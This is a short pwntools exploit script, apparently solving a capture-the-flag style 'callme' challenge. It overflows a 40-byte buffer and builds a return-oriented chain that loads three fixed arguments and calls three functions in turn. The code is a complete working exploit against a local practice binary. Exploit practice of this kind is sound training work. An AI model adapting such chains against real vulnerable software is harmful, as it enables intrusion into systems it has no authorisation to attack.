#!/usr/bin/env python3

from pwn import *

pwn = './callme'
buffer = 40

io = process(pwn)
io.recvuntil(b'> ')

f = open('input','wb')

CALLME_ONE = 0x400720
CALLME_TWO = 0x400740
CALLME_THREE = 0x4006f0
POP_ALL = 0x40093c
RET = 0x4009bc
EXIT = 0x400750

payload = p64(POP_ALL) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(CALLME_ONE) + \
		  p64(POP_ALL) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(CALLME_TWO) + \
		  p64(POP_ALL) + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(CALLME_THREE) + \
		  p64(POP_ALL) + p64(0x1) + p64(EXIT)
f.write(b'A'*buffer + payload)

io.sendline(b'A'*buffer + payload)
io.interactive()